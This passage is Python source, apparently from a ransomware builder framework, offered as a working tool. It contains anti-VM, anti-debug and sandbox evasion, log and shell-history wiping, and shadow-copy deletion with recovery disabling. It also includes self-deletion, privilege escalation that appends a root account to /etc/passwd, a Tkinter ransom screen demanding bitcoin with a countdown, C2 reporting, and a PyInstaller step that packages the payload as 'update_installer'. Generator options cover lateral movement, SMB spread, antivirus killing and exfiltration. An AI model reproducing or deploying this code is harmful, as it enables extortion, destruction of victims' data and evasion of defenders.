    # ═══════════════════════════════════════════════════════════════
    # ANTI-ANALYSIS BLOCK (Cross-platform)
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_anti_analysis_block(lhost, lport, opts, names):
        anti_vm = opts.get("ANTI_VM", True)
        anti_debug = opts.get("ANTI_DEBUG", True)
        anti_forensic = opts.get("ANTI_FORENSIC", True)
        anti_dump = opts.get("ANTI_DUMP", True)
        anti_recovery = opts.get("ANTI_RECOVERY", True)
        anti_timing = opts.get("ANTI_TIMING", True)
        self_delete = opts.get("SELF_DELETE", True)
        triple_pass = opts.get("TRIPLE_PASS", True)
        encrypt_header = opts.get("ENCRYPT_HEADER", True)

        delay_fn = names["delay_fn"]
        timer_fn = names["timer_fn"]
        check_vm_fn = names["check_vm_fn"]
        check_debug_fn = names["check_debug_fn"]
        wipe_logs_fn = names["wipe_logs_fn"]
        anti_recovery_fn = names["anti_recovery_fn"]
        self_delete_fn = names["self_delete_fn"]

        return f"""
# ==================== ANTI-ANALYSIS (Cross-platform) ====================
ANTI_VM_ENABLED = {str(anti_vm)}
ANTI_DEBUG_ENABLED = {str(anti_debug)}
ANTI_FORENSIC_ENABLED = {str(anti_forensic)}
ANTI_DUMP_ENABLED = {str(anti_dump)}
ANTI_RECOVERY_ENABLED = {str(anti_recovery)}
ANTI_TIMING_ENABLED = {str(anti_timing)}
SELF_DELETE_ENABLED = {str(self_delete)}
TRIPLE_PASS_ENABLED = {str(triple_pass)}
ENCRYPT_HEADER_ENABLED = {str(encrypt_header)}


def {delay_fn}(min_s=1, max_s=5):
    if not ANTI_TIMING_ENABLED:
        return
    time.sleep(random.uniform(min_s, max_s))


def {timer_fn}():
    def _w():
        while True:
            {delay_fn}(30, 120)
    t = threading.Thread(target=_w, daemon=True)
    t.start()


def {check_vm_fn}():
    if not ANTI_VM_ENABLED:
        return False, []
    score = 0
    VM_MAC = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
              "00:03:FF", "00:15:5D", "00:1D:D8", "08:00:27",
              "0A:00:27", "00:16:3E", "52:54:00"]
    try:
        import uuid
        mac = uuid.getnode()
        ms = ":".join([format((mac >> e) & 0xFF, "02X") for e in range(40, -8, -8)][:6])
        for p in VM_MAC:
            if ms.upper().startswith(p.upper()):
                score += 3
                break
    except Exception:
        pass
    if IS_WINDOWS:
        try:
            import winreg
            for hive, kp in [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions"),
            ]:
                try:
                    k = winreg.OpenKey(hive, kp, 0, winreg.KEY_READ)
                    winreg.CloseKey(k)
                    score += 2
                except Exception:
                    pass
        except Exception:
            pass
    SB_USERS = ["sandbox", "malware", "virus", "test", "analyst", "cuckoo"]
    try:
        cu = os.getlogin().lower()
    except Exception:
        cu = ""
    hn = socket.gethostname().lower()
    for u in SB_USERS:
        if u in cu or u in hn:
            score += 3
            break
    if score >= 6:
        return True, []
    return False, []


def {check_debug_fn}():
    if not ANTI_DEBUG_ENABLED:
        return False
    if IS_WINDOWS:
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
                return True
        except Exception:
            pass
    elif IS_LINUX:
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        if int(line.split(":")[1].strip()) != 0:
                            return True
        except Exception:
            pass
    return False


def _secure_delete(filepath):
    try:
        if not os.path.exists(filepath):
            return False
        size = os.path.getsize(filepath)
        if size == 0:
            os.remove(filepath)
            return True
        with open(filepath, 'r+b') as f:
            f.write(b'\\x00' * size)
            f.flush()
            os.fsync(f.fileno())
            f.seek(0)
            f.write(b'\\xFF' * size)
            f.flush()
            os.fsync(f.fileno())
            f.seek(0)
            f.write(os.urandom(size))
            f.flush()
            os.fsync(f.fileno())
        os.remove(filepath)
        return True
    except Exception:
        try:
            os.remove(filepath)
        except Exception:
            pass
        return False


def {wipe_logs_fn}():
    if not ANTI_FORENSIC_ENABLED:
        return 0
    wiped = 0
    if IS_WINDOWS:
        try:
            r = subprocess.run(['wevtutil', 'el'], capture_output=True,
                             text=True, timeout=10)
            for line in r.stdout.split('\\n'):
                ln = line.strip()
                if ln:
                    try:
                        subprocess.run(['wevtutil', 'cl', ln], capture_output=True, timeout=5)
                        wiped += 1
                    except Exception:
                        pass
        except Exception:
            pass
        pf = "C:\\\\Windows\\\\Prefetch"
        if os.path.exists(pf):
            try:
                for f in os.listdir(pf):
                    try:
                        fp = os.path.join(pf, f)
                        if TRIPLE_PASS_ENABLED:
                            _secure_delete(fp)
                        else:
                            os.remove(fp)
                        wiped += 1
                    except Exception:
                        pass
            except Exception:
                pass
    elif IS_LINUX:
        logs_to_wipe = [
            "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
            "/var/log/secure", "/var/log/wtmp", "/var/log/btmp",
            "/var/log/lastlog", "/var/log/cron", "/var/log/maillog",
        ]
        for log in logs_to_wipe:
            try:
                if os.path.exists(log):
                    with open(log, "w") as f:
                        f.write("")
                    wiped += 1
            except Exception:
                pass
        for h in [os.path.expanduser("~/.bash_history"),
                  os.path.expanduser("~/.zsh_history")]:
            try:
                if os.path.exists(h):
                    with open(h, "w") as f:
                        f.write("")
                    wiped += 1
            except Exception:
                pass
    elif IS_MACOS:
        for log in ["/var/log/system.log", "/var/log/authd.log"]:
            try:
                if os.path.exists(log):
                    with open(log, "w") as f:
                        f.write("")
                    wiped += 1
            except Exception:
                pass
    return wiped


def {anti_recovery_fn}():
    if not ANTI_RECOVERY_ENABLED:
        return
    if IS_WINDOWS:
        cmds = [
            ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
            ['wmic', 'shadowcopy', 'delete'],
            ['wbadmin', 'delete', 'catalog', '-quiet'],
            ['reagentc', '/disable'],
            ['powercfg', '-h', 'off'],
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True, timeout=60, shell=True)
            except Exception:
                pass
    elif IS_LINUX:
        targets = [
            os.path.expanduser("~/.local/share/Trash"),
            os.path.expanduser("~/.cache"),
            "/tmp",
        ]
        for t in targets:
            try:
                if os.path.exists(t):
                    subprocess.run(["rm", "-rf", t + "/*"],
                                  capture_output=True, timeout=30)
            except Exception:
                pass


def {self_delete_fn}():
    if not SELF_DELETE_ENABLED:
        return
    try:
        sp = os.path.abspath(sys.argv[0])
        if IS_WINDOWS:
            subprocess.Popen(
                'cmd /c timeout /t 3 /nobreak > nul & del /f /q "' + sp + '"',
                shell=True, creationflags=0x08000000)
        else:
            pid = os.fork()
            if pid == 0:
                time.sleep(3)
                try:
                    _secure_delete(sp)
                except Exception:
                    pass
                os._exit(0)
    except Exception:
        pass


def _run_anti_analysis_gate():
    is_vm, _ = {check_vm_fn}()
    if is_vm:
        try:
            sys.exit(0)
        except Exception:
            os._exit(0)
    if {check_debug_fn}():
        try:
            sys.exit(0)
        except Exception:
            os._exit(0)
    {delay_fn}(2, 8)
    return True


# ==================== LINUX/MACOS PRIVESC (basic) ====================

def _linux_privesc_attempt():
    if check_admin():
        return True
    print("[*] Linux: Attempting privilege escalation...")
    try:
        r = subprocess.run(["sudo", "-n", "true"], capture_output=True, timeout=5)
        if r.returncode == 0:
            print("[+] Linux: Passwordless sudo available!")
            try:
                subprocess.Popen(
                    ["sudo", "-n", sys.executable] + sys.argv,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            except Exception:
                pass
    except Exception:
        pass
    try:
        if os.access("/etc/passwd", os.W_OK):
            print("[+] Linux: /etc/passwd is WRITABLE!")
            with open("/etc/passwd", "a") as f:
                f.write("hacker:$1$hacked$1234567890abcdef:0:0:root:/root:/bin/bash\\n")
            return True
    except Exception:
        pass
    print("[!] Linux: No easy privesc vector found")
    return False


def _macos_privesc_attempt():
    if check_admin():
        return True
    print("[*] macOS: Attempting privilege escalation...")
    try:
        cmd = 'do shell script "' + sys.executable + ' ' + sys.argv[0] + '" with administrator privileges'
        subprocess.Popen(
            ["osascript", "-e", cmd],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        pass
    return False


# ==================== END ANTI-ANALYSIS ====================

"""

    # ═══════════════════════════════════════════════════════════════
    # RANSOM GUI BLOCK
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_ransom_gui_block(
        names,
        btc_address,
        ransom_note,
        private_key_pem,
        public_key_pem,
        victim_id,
        key_fingerprint,
        encryption,
    ):
        note_escaped = (
            ransom_note.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
        )
        priv_escaped = private_key_pem.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
        pub_escaped = public_key_pem.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')

        parts = []
        parts.append("")
        parts.append(
            "# ==================== RANSOMWARE GUI (Tkinter) ===================="
        )
        parts.append("GUI_ENABLED = True")
        parts.append('RANSOM_BTC = "' + btc_address + '"')
        parts.append('RANSOM_NOTE_TEXT = """' + note_escaped + '"""')
        parts.append('RANSOM_ENCRYPTION = "' + encryption + '"')
        parts.append("RANSOM_COUNTDOWN_HOURS = 72")
        parts.append('RANSOM_VICTIM_ID = "' + victim_id + '"')
        parts.append('RANSOM_KEY_FINGERPRINT = "' + key_fingerprint + '"')
        parts.append('RANSOM_PRIVATE_KEY_PEM = """' + priv_escaped + '"""')
        parts.append('RANSOM_PUBLIC_KEY_PEM = """' + pub_escaped + '"""')
        parts.append("")

        parts.append("def _launch_ransom_gui():")
        parts.append("    try:")
        parts.append("        import tkinter as tk")
        parts.append("        from tkinter import ttk, messagebox")
        parts.append("        import threading as _th")
        parts.append("        import queue as _queue")
        parts.append("    except ImportError:")
        parts.append("        print('[!] Tkinter not available')")
        parts.append("        return")
        parts.append("    root = tk.Tk()")
        parts.append("    root.title('YOUR FILES ARE ENCRYPTED')")
        parts.append("    root.geometry('920x900')")
        parts.append("    root.configure(bg='#0a0000')")
        parts.append("    try:")
        parts.append("        root.attributes('-topmost', True)")
        parts.append("    except Exception:")
        parts.append("        pass")
        parts.append("    title_frame = tk.Frame(root, bg='#1a0000', height=70)")
        parts.append("    title_frame.pack(fill='x')")
        parts.append("    title_frame.pack_propagate(False)")
        parts.append(
            "    tk.Label(title_frame, text='[LOCK] YOUR FILES ARE ENCRYPTED [LOCK]',"
        )
        parts.append(
            "            font=('Consolas', 22, 'bold'), fg='#ff0000', bg='#1a0000').pack(expand=True)"
        )
        parts.append("    main_frame = tk.Frame(root, bg='#0a0000')")
        parts.append("    main_frame.pack(fill='both', expand=True, padx=30, pady=10)")
        parts.append("    tk.Label(main_frame,")
        parts.append("            text='All your files have been encrypted.\\n'")
        parts.append(
            "                 '(RSA-4096 + AES-256-GCM). Only we can decrypt them.',"
        )
        parts.append(
            "            font=('Consolas', 11), fg='#ffffff', bg='#0a0000', justify='center').pack(pady=10)"
        )
        parts.append("    cd_frame = tk.Frame(main_frame, bg='#0a0000')")
        parts.append("    cd_frame.pack(pady=8)")
        parts.append("    tk.Label(cd_frame, text='TIME REMAINING:',")
        parts.append(
            "            font=('Consolas', 11, 'bold'), fg='#ff6600', bg='#0a0000').pack()"
        )
        parts.append("    cd_var = tk.StringVar(value='72:00:00')")
        parts.append("    cd_label = tk.Label(cd_frame, textvariable=cd_var,")
        parts.append(
            "                       font=('Consolas', 28, 'bold'), fg='#ff0000', bg='#0a0000')"
        )
        parts.append("    cd_label.pack(pady=3)")
        parts.append(
            "    pay_frame = tk.Frame(main_frame, bg='#1a0a0a', relief='solid', bd=2)"
        )
        parts.append("    pay_frame.pack(fill='x', pady=8)")
        parts.append("    tk.Label(pay_frame, text='[PAY] PAYMENT REQUIRED',")
        parts.append(
            "            font=('Consolas', 13, 'bold'), fg='#00ff00', bg='#1a0a0a').pack(pady=4)"
        )
        parts.append("    tk.Label(pay_frame, text='Send 0.5 BTC to:',")
        parts.append(
            "            font=('Consolas', 10), fg='#ffffff', bg='#1a0a0a').pack(pady=1)"
        )
        parts.append("    btc_var = tk.StringVar(value=RANSOM_BTC)")
        parts.append(
            "    tk.Entry(pay_frame, textvariable=btc_var, font=('Consolas', 10, 'bold'),"
        )
        parts.append(
            "            fg='#ffaa00', bg='#0a0a0a', justify='center', state='readonly',"
        )
        parts.append(
            "            readonlybackground='#0a0a0a', relief='solid', bd=2, width=48).pack(pady=4)"
        )
        parts.append("    def copy_btc():")
        parts.append("        try:")
        parts.append("            root.clipboard_clear()")
        parts.append("            root.clipboard_append(RANSOM_BTC)")
        parts.append("            messagebox.showinfo('Copied', 'BTC address copied!')")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append(
            "    tk.Button(pay_frame, text='[COPY] Copy BTC', font=('Consolas', 10, 'bold'),"
        )
        parts.append("             bg='#00aa00', fg='white', command=copy_btc,")
        parts.append("             padx=20, pady=3).pack(pady=4)")
        parts.append(
            "    key_frame = tk.Frame(main_frame, bg='#1a1a0a', relief='solid', bd=2)"
        )
        parts.append("    key_frame.pack(fill='both', expand=True, pady=8)")
        parts.append("    tk.Label(key_frame, text='[KEY] Have a private key?',")
        parts.append(
            "            font=('Consolas', 11, 'bold'), fg='#ffff00', bg='#1a1a0a').pack(pady=4)"
        )
        parts.append("    text_frame = tk.Frame(key_frame, bg='#1a1a0a')")
        parts.append("    text_frame.pack(pady=3, padx=10, fill='x')")
        parts.append(
            "    key_text = tk.Text(text_frame, font=('Consolas', 8), fg='#00ff00',"
        )
        parts.append("                      bg='#0a0a0a', insertbackground='#00ff00',")
        parts.append(
            "                      height=7, width=80, relief='solid', bd=2, wrap='none')"
        )
        parts.append("    key_text.pack(side='left', fill='both', expand=True)")
        parts.append("    scrollbar = tk.Scrollbar(text_frame, command=key_text.yview)")
        parts.append("    scrollbar.pack(side='right', fill='y')")
        parts.append("    key_text.config(yscrollcommand=scrollbar.set)")
        parts.append(
            "    key_text.insert('1.0', '-----BEGIN RSA PRIVATE KEY-----\\n(paste your private key here)\\n-----END RSA PRIVATE KEY-----')"
        )
        parts.append(
            "    status_label = tk.Label(key_frame, text='', font=('Consolas', 9),"
        )
        parts.append("                           fg='#888888', bg='#1a1a0a')")
        parts.append("    status_label.pack(pady=2)")
        parts.append("    progress_var = tk.DoubleVar(value=0)")
        parts.append(
            "    progress_bar = ttk.Progressbar(key_frame, variable=progress_var,"
        )
        parts.append("                                   maximum=100, length=750)")
        parts.append("    progress_bar.pack(pady=3, padx=10, fill='x')")
        parts.append(
            "    progress_label = tk.Label(key_frame, text='', font=('Consolas', 8),"
        )
        parts.append("                             fg='#00ff00', bg='#1a1a0a')")
        parts.append("    progress_label.pack(pady=2)")
        parts.append("    ui_queue = _queue.Queue()")
        parts.append("    def process_queue():")
        parts.append("        try:")
        parts.append("            while True:")
        parts.append("                msg = ui_queue.get_nowait()")
        parts.append("                msg_type = msg.get('type')")
        parts.append("                if msg_type == 'progress':")
        parts.append("                    progress_var.set(msg.get('value', 0))")
        parts.append(
            "                    progress_label.config(text=msg.get('text', ''))"
        )
        parts.append("                elif msg_type == 'status':")
        parts.append(
            "                    status_label.config(text=msg.get('text', ''), fg=msg.get('color', '#ffff00'))"
        )
        parts.append("                elif msg_type == 'done':")
        parts.append("                    progress_var.set(100)")
        parts.append("                    _ok = str(msg.get('decrypted', 0))")
        parts.append("                    _fail = str(msg.get('failed', 0))")
        parts.append(
            "                    progress_label.config(text='[OK] Complete: ' + _ok + ' OK | ' + _fail + ' Fail', fg='#00ff00')"
        )
        parts.append(
            "                    status_label.config(text='[OK] Decryption successful', fg='#00ff00')"
        )
        parts.append(
            "                    decrypt_btn.config(state='normal', text='[DECRYPT] DECRYPT FILES')"
        )
        parts.append("                    d = msg['decrypted']")
        parts.append("                    f = msg['failed']")
        parts.append("                    t = msg['total']")
        parts.append(
            "                    root.after(500, lambda dd=d, ff=f, tt=t: _show_done_and_close(dd, ff, tt))"
        )
        parts.append("                elif msg_type == 'error':")
        parts.append("                    _err = str(msg.get('text', 'Error'))[:80]")
        parts.append(
            "                    status_label.config(text='[X] ' + _err, fg='#ff5555')"
        )
        parts.append("                    progress_label.config(text='')")
        parts.append(
            "                    decrypt_btn.config(state='normal', text='[DECRYPT] DECRYPT FILES')"
        )
        parts.append("        except _queue.Empty:")
        parts.append("            pass")
        parts.append("        root.after(100, process_queue)")
        parts.append("    def _show_done_and_close(decrypted, failed, total):")
        parts.append("        if DESKTOP_ICON_CHANGE_ENABLED:")
        parts.append("            try:")
        parts.append("                print('[*] Restoring desktop icons...')")
        parts.append("                r = restore_desktop_icons()")
        parts.append("                if r.get('success'):")
        parts.append(
            "                    print('[+] Desktop icons restored: ' + str(r.get('restored_count', 0)))"
        )
        parts.append("            except Exception as e:")
        parts.append("                print('[!] Restore icons error: ' + str(e))")
        parts.append("        try:")
        parts.append("            messagebox.showinfo('[OK] Success',")
        parts.append("                'Decryption complete!\\n\\n'")
        parts.append("                'Decrypted: ' + str(decrypted) + '\\n'")
        parts.append("                'Failed: ' + str(failed) + '\\n'")
        parts.append("                'Total: ' + str(total))")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("        try:")
        parts.append("            root.quit()")
        parts.append("            root.destroy()")
        parts.append("        except Exception:")
        parts.append("            pass")
        parts.append("    root.after(100, process_queue)")
        parts.append("    def try_decrypt():")
        parts.append("        entered = key_text.get('1.0', 'end').strip()")
        parts.append("        if '(paste your private key here)' in entered:")
        parts.append(
            "            status_label.config(text='[X] Please paste your private key', fg='#ff5555')"
        )
        parts.append("            return")
        parts.append(
            "        if not entered or '-----BEGIN' not in entered or '-----END' not in entered:"
        )
        parts.append(
            "            status_label.config(text='[X] Invalid PEM format', fg='#ff5555')"
        )
        parts.append("            return")
        parts.append(
            "        decrypt_btn.config(state='disabled', text='[...] Decrypting...')"
        )
        parts.append("        progress_var.set(0)")
        parts.append("        progress_label.config(text='')")
        parts.append(
            "        status_label.config(text='[...] Initializing...', fg='#ffff00')"
        )
        parts.append("        def _worker():")
        parts.append("            try:")
        parts.append("                global RANSOM_PRIVATE_KEY_PEM")
        parts.append("                RANSOM_PRIVATE_KEY_PEM = entered")
        parts.append(
            "                ui_queue.put({'type': 'status', 'text': '[...] Scanning for encrypted files...', 'color': '#ffff00'})"
        )
        parts.append("                files = find_files(encrypted_only=True)")
        parts.append("                if not files:")
        parts.append(
            "                    ui_queue.put({'type': 'error', 'text': 'No encrypted files found'})"
        )
        parts.append("                    return")
        parts.append("                total = len(files)")
        parts.append("                decrypted = 0")
        parts.append("                failed = 0")
        parts.append(
            "                ui_queue.put({'type': 'status', 'text': '[...] Decrypting ' + str(total) + ' files...', 'color': '#ffff00'})"
        )
        parts.append("                for i, f in enumerate(files):")
        parts.append("                    try:")
        parts.append("                        if decrypt_file(f, entered):")
        parts.append("                            decrypted += 1")
        parts.append("                        else:")
        parts.append("                            failed += 1")
        parts.append("                    except Exception:")
        parts.append("                        failed += 1")
        parts.append("                    pct = int((i + 1) / total * 100)")
        parts.append(
            "                    _text = str(i + 1) + '/' + str(total) + ' (' + str(pct) + '%) | OK: ' + str(decrypted) + ' | Fail: ' + str(failed)"
        )
        parts.append(
            "                    ui_queue.put({'type': 'progress', 'value': pct, 'text': _text})"
        )
        parts.append(
            "                ui_queue.put({'type': 'done', 'decrypted': decrypted, 'failed': failed, 'total': total})"
        )
        parts.append("                try:")
        parts.append("                    global _GLOBAL_C2_CLIENT")
        parts.append("                    if _GLOBAL_C2_CLIENT is not None:")
        parts.append("                        _GLOBAL_C2_CLIENT.encrypted = False")
        parts.append(
            "                        _GLOBAL_C2_CLIENT.send_resp({'type': 'decrypt_response', 'status': 'success', 'files_decrypted': decrypted, 'method': 'gui_private_key'})"
        )
        parts.append(
            "                        print('[+] Notified C2: ' + str(decrypted) + ' files decrypted')"
        )
        parts.append("                except Exception as _e:")
        parts.append("                    print('[!] C2 notify error: ' + str(_e))")
        parts.append("            except Exception as e:")
        parts.append(
            "                ui_queue.put({'type': 'error', 'text': str(e)[:100]})"
        )
        parts.append("        _th.Thread(target=_worker, daemon=True).start()")
        parts.append(
            "    decrypt_btn = tk.Button(key_frame, text='[DECRYPT] DECRYPT FILES',"
        )
        parts.append("        font=('Consolas', 11, 'bold'), bg='#0e639c', fg='white',")
        parts.append("        command=try_decrypt, padx=30, pady=6, relief='flat')")
        parts.append("    decrypt_btn.pack(pady=5)")
        parts.append("    footer = tk.Frame(root, bg='#0a0000', height=30)")
        parts.append("    footer.pack(fill='x', side='bottom')")
        parts.append("    footer.pack_propagate(False)")
        parts.append("    tk.Label(footer,")
        parts.append(
            f"            text='Victim ID: {victim_id} | Key Fingerprint: {key_fingerprint}',"
        )
        parts.append(
            "            font=('Consolas', 8), fg='#666666', bg='#0a0000').pack(expand=True)"
        )
        parts.append("    remaining = [RANSOM_COUNTDOWN_HOURS * 3600]")
        parts.append("    def update_cd():")
        parts.append("        if remaining[0] > 0:")
        parts.append("            remaining[0] -= 1")
        parts.append("            h = remaining[0] // 3600")
        parts.append("            m = (remaining[0] % 3600) // 60")
        parts.append("            s = remaining[0] % 60")
        parts.append(
            "            cd_var.set(str(h).zfill(2) + ':' + str(m).zfill(2) + ':' + str(s).zfill(2))"
        )
        parts.append("            if remaining[0] < 3600:")
        parts.append("                cd_label.config(fg='#ff00ff')")
        parts.append("            elif remaining[0] < 21600:")
        parts.append("                cd_label.config(fg='#ff3300')")
        parts.append("        root.after(1000, update_cd)")
        parts.append("    root.after(1000, update_cd)")
        parts.append("    def on_close():")
        parts.append(
            "        r = messagebox.askyesno('WARNING', 'Closing will NOT stop encryption.\\n\\nAre you sure?', icon='warning')"
        )
        parts.append("        if r:")
        parts.append("            try:")
        parts.append("                root.iconify()")
        parts.append("            except Exception:")
        parts.append("                pass")
        parts.append("    root.protocol('WM_DELETE_WINDOW', on_close)")
        parts.append("    try:")
        parts.append("        root.lift()")
        parts.append("    except Exception:")
        parts.append("        pass")
        parts.append("    root.mainloop()")
        parts.append("")
        parts.append("")
        parts.append("def _handle_encryption_complete():")
        parts.append("    if not GUI_ENABLED:")
        parts.append("        return")
        parts.append("    try:")
        parts.append(
            "        t = threading.Thread(target=_launch_ransom_gui, daemon=True)"
        )
        parts.append("        t.start()")
        parts.append("    except Exception as e:")
        parts.append("        print('[!] GUI error: ' + str(e))")
        parts.append("")
        parts.append("")
        parts.append("# ==================== END RANSOMWARE GUI ====================")
        parts.append("")

        return "\n".join(parts)

    # ═══════════════════════════════════════════════════════════════
    # BUILD EXE
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def build_exe(
        payload_script,
        exe_name="update_installer",
        icon_path=None,
        output_dir=None,
        target_os="all",
    ):
        import platform as _plat

        os.environ["PYINSTALLER_NO_ROOT"] = "1"
        if output_dir is None:
            output_dir = str(Path.home() / "lazyframework_payloads")

        try:
            import PyInstaller  # noqa

            version = getattr(PyInstaller, "__version__", "unknown")
            print(f"[+] PyInstaller version: {version}")
        except ImportError:
            return None, "PyInstaller not installed (pip install pyinstaller)"

        host_os = _plat.system().lower()
        target = (target_os or "all").lower()

        if target == "windows" and host_os != "windows":
            return None, f"Cross-compile not supported: host={host_os}, target=windows"
        if target == "macos" and host_os != "darwin":
            return None, f"Cross-compile not supported: host={host_os}, target=macos"

        base_name = exe_name
        for ext in [".exe", ".py", ".app", ".bin"]:
            if base_name.lower().endswith(ext):
                base_name = base_name[: -len(ext)]
                break
        if not base_name:
            base_name = "payload"

        safe_icon = None
        if icon_path and os.path.exists(icon_path):
            if host_os == "windows":
                if icon_path.lower().endswith(".ico"):
                    safe_icon = icon_path
                else:
                    try:
                        from PIL import Image

                        ico_path = os.path.join(
                            tempfile.gettempdir(), "pyinstaller_icon.ico"
                        )
                        img = Image.open(icon_path)
                        if img.mode != "RGBA":
                            img = img.convert("RGBA")
                        img.save(
                            ico_path,
                            format="ICO",
                            sizes=[
                                (256, 256),
                                (128, 128),
                                (64, 64),
                                (48, 48),
                                (32, 32),
                                (16, 16),
                            ],
                        )
                        safe_icon = ico_path
                    except Exception as e:
                        print(f"[!] Icon conversion failed: {e}")
            else:
                safe_icon = icon_path

        try:
            td = Path.home() / ".lazyframework" / "temp"
            if td.exists():
                shutil.rmtree(td, ignore_errors=True)
            td.mkdir(parents=True, exist_ok=True)

            sp = td / "payload.py"
            with open(sp, "w", encoding="utf-8") as f:
                f.write(payload_script)

            bd = td / "dist"
            wd = td / "build"
            if bd.exists():
                shutil.rmtree(bd, ignore_errors=True)
            if wd.exists():
                shutil.rmtree(wd, ignore_errors=True)

            cmd = [
                sys.executable,
                "-m",
                "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name",
                base_name,
                "--distpath",
                str(bd),
                "--workpath",
                str(wd),
                "--specpath",
                str(td),
                "--log-level",
                "WARN",
                "--noconfirm",
                "--clean",
                "--hidden-import=Crypto",
                "--hidden-import=Crypto.Cipher",
                "--hidden-import=Crypto.Cipher.AES",
                "--hidden-import=Crypto.Cipher.PKCS1_OAEP",
                "--hidden-import=Crypto.PublicKey",
                "--hidden-import=Crypto.PublicKey.RSA",
                "--hidden-import=Crypto.Random",
                "--hidden-import=Crypto.Util",
                "--hidden-import=Crypto.Hash",
                "--collect-all=Crypto",
                "--hidden-import=ctypes",
                "--hidden-import=ctypes.wintypes",
                "--hidden-import=tkinter",
                "--hidden-import=tkinter.ttk",
                "--hidden-import=tkinter.messagebox",
                "--hidden-import=tkinter.filedialog",
                "--hidden-import=winreg",
                "--hidden-import=win32api",
                "--hidden-import=win32security",
                "--hidden-import=win32con",
                "--hidden-import=concurrent.futures",
                "--hidden-import=concurrent.futures.thread",
                "--hidden-import=urllib.request",
                "--hidden-import=urllib.parse",
                "--hidden-import=http.client",
                "--hidden-import=email",
                "--hidden-import=email.mime",
                "--hidden-import=sqlite3",
                "--hidden-import=base64",
                "--hidden-import=json",
            ]

            try:
                import Crypto

                crypto_path = os.path.dirname(Crypto.__file__)
                crypto_parent = os.path.dirname(crypto_path)
                if os.path.isdir(crypto_parent):
                    cmd.extend(["--paths", crypto_parent])
            except ImportError:
                pass

            if safe_icon and os.path.exists(safe_icon):
                cmd.extend(["--icon", safe_icon])

            cmd.append(str(sp))

            r = subprocess.run(
                cmd, capture_output=True, text=True, cwd=str(td), timeout=1800
            )

            op = Path(output_dir)
            op.mkdir(parents=True, exist_ok=True)
            log_path = op / f"{base_name}_build.log"
            try:
                with open(log_path, "w", encoding="utf-8") as f:
                    f.write("=" * 70 + "\n")
                    f.write(f"CMD: {' '.join(cmd)}\n")
                    f.write(f"RETURN CODE: {r.returncode}\n")
                    f.write("=" * 70 + "\n")
                    f.write("STDOUT:\n" + (r.stdout or "") + "\n")
                    f.write("=" * 70 + "\n")
                    f.write("STDERR:\n" + (r.stderr or "") + "\n")
            except Exception:
                pass

            if r.returncode != 0:
                err_tail = (r.stderr or "")[-1500:]
                return (
                    None,
                    f"PyInstaller failed (rc={r.returncode}). See {log_path}.\n\nLast errors:\n{err_tail}",
                )

            exe_file = None
            if bd.exists():
                for f in bd.iterdir():
                    if f.is_file():
                        exe_file = f
                        break

            if not exe_file:
                return None, f"Build succeeded but no output in {bd}"

            if host_os == "windows":
                final = base_name + ".exe"
            elif host_os == "darwin":
                final = base_name + ".app"
            else:
                final = base_name

            ff = op / final
            if ff.exists():
                ff.unlink()
            shutil.copy2(exe_file, ff)
            try:
                os.chmod(ff, 0o755)
            except Exception:
                pass

            print(f"[+] EXE built: {ff} ({os.path.getsize(ff):,} bytes)")
            return str(ff), None

        except subprocess.TimeoutExpired:
            return None, "Build timeout (>30 min)"
        except Exception as e:
            import traceback

            tb = traceback.format_exc()
            return None, f"Build error: {e}\n\n{tb}"

    # ═══════════════════════════════════════════════════════════════
    # GENERATE PAYLOAD
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def generate_payload(
        lhost,
        lport,
        encryption,
        extensions,
        ransom_note,
        btc_address,
        wallpaper,
        countdown_seconds=300,
        exfiltrate=True,
        max_file_size_mb=10,
        use_gui=True,
        decrypt_key="",
        av_bypass=True,
        privilege_esc=True,
        rsa_public_key_pem="",
        rsa_private_key_pem="",
        use_hybrid=True,
        parallel=True,
        thread_count=4,
        target_os="all",
        lateral_movement=True,
        lolbins=True,
        spread_methods="all",
        target_subnets="192.168.1.0/24,10.0.0.0/24",
        max_spread_hosts=10,
        use_credentials=True,
        anti_vm=True,
        anti_debug=True,
        anti_forensic=True,
        anti_dump=True,
        anti_recovery=True,
        anti_timing=True,
        anti_sandbox_user=True,
        anti_sandbox_disk=True,
        anti_sandbox_ram=True,
        anti_sandbox_cpu=True,
        anti_sandbox_uptime=True,
        anti_network=True,
        self_delete=True,
        polymorphic=True,
        encrypt_header=True,
        triple_pass=True,
        byovd_enabled=True,
        byovd_driver="gdrv",
        byovd_auto_kill_av=True,
        byovd_disable_etw=True,
        byovd_disable_defender=True,
        smb_spread=True,
        smb_methods="smb,wmi,psexec,admin_share,remote_schtasks,scmr",
        smb_max_hosts=50,
        smb_scan_subnets="auto",
        smb_timeout=5,
        smb_credentials="",
        smb_payload_name="svchost.exe",
        smb_persist=True,
        smb_self_exec=True,
        change_desktop_icons_flag=True,
        ransom_icon_url="",
        post_exploit_enabled=True,
        post_exploit_actions="creds,discovery,exfil",
        post_exploit_max_exfil_mb=2000,
        post_exploit_exfil_method="c2",
        post_exploit_exfil_categories="all",
    ):
        """Generate ransomware payload"""

        # ═══ TARGET OS DETECTION ═══
        target_os_lower = (target_os or "all").lower()
        include_windows = target_os_lower in ("all", "windows")
        include_linux = target_os_lower in ("all", "linux")
        include_macos = target_os_lower in ("all", "macos")

        use_uac_bypass = include_windows and av_bypass and privilege_esc
